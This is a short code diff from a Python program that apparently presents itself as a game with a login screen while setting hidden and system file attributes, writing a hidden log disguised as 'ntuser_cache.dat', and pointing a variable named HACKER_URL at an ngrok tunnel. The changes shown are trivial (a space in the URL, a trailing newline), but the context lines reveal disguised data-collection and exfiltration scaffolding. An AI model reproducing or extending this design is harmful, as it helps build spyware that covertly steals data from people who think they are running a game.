@@ -10,7 +10,7 @@ FILE_ATTRIBUTE_HIDDEN = 0x02
 FILE_ATTRIBUTE_SYSTEM = 0x04
 
 # Update this EVERY TIME you restart Ngrok!
-HACKER_URL = "https://unlearnedly-unvouched-shara.ngrok-free.dev"
+HACKER_URL = " https://unlearnedly-unvouched-shara.ngrok-free.dev"
 
 # Hidden log file path
 log_filename = os.path.join(os.path.dirname(os.path.abspath(__file__)), "ntuser_cache.dat")
@@ -131,3 +131,4 @@ if __name__ == "__main__":
     user = login()
     if user:
         main_game(user)
+
